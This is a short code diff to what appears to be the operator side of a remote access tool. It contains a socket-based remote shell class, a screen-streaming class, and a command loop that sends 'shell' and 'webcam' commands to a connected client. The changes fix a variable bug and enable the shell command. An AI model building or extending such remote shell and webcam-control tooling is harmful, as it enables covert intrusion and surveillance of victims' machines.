@@ -55,7 +55,7 @@ class Shell:
 			out = self.client_socket.recv(BUFFER_SIZE).decode().strip()
 			sys.stdout.write(out)
 			try:
-				cmd = input("$> ")
+				cmd = input("")
 			except EOFError:
 				print("")
 				return
@@ -65,7 +65,7 @@ class Shell:
 			if cmd == 'exit':
 				return
 			self.client_socket.send(cmd.encode())
-			sys.stdout.write("\033[A" + ans.split("\n")[-1])
+			sys.stdout.write("\033[A" + cmd.split("\n")[-1])
 			# pass
 
 class ScreenStream:
@@ -127,7 +127,7 @@ def main_loop(client_socket):
 		if not cmd:
 			continue
 		if cmd == "shell":
-			# client_socket.send(cmd.encode())
+			client_socket.send(cmd.encode())
 			shell = Shell(client_socket)
 			shell.start()
 		elif cmd.split()[0] == "webcam":
